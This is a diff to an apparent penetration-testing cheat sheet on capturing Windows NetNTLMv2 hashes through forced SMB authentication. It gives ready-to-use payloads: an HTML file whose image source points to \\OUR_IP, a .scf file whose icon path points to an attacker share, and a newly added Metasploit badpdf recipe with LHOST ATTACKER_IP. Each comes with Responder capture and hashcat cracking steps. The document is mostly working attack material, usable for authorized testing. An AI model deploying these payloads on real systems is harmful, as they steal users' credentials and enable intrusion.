@@ -24,11 +24,11 @@
 
 #### 1) Create an HTML document that points to your SMB server
 
-#### <html<
-####   <body<
-####     <img src=\\OUR_IP\share\WHATEVER.png /<
-####        </body<
-#### </html<
+     <html>
+       <body>
+         <img src=\\OUR_IP\share\WHATEVER.png />
+            </body>
+     </html>
 
 #### 2) On a windows machine, use the HTML Help Workshop https://www.microsoft.com/en-us/download/confirmation.aspx?id=21138
 
@@ -48,14 +48,38 @@
 
 #### 1) Create an .scf file that points to your SMB server
 
-#### [Shell]
-#### Command=2
-#### IconFile=\\OUR_IP\share\pwn.ico
-#### [Taskbar]
-#### Command=ToggleDesktop
+     [Shell]
+     Command=2
+     IconFile=\\OUR_IP\share\pwn.ico
+     [Taskbar]
+     Command=ToggleDesktop
 
 #### 2) sudo responder -I INTERFACE (Start responder)
 
 #### 3) Upload the .scf file to a writebale SMB share
 
 #### 4) Crack the hash you captured with hashcat
+
+### .PDF Files
+
+Use the metasploit module to craft a malicious PDF file
+
+    use auxiliary/fileformat/badpdf
+
+Set correct parameters
+
+    set FILENAME filename.pdf
+
+    set LHOST ATTACKER_IP
+
+    exploit
+
+Run responder
+
+    sudo responder -I INTERFACE
+
+Upload file to target server, then wait for someone to click on the file to capture his NetNTLMv2 hash.
+
+Crack it with hashcat
+
+    hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
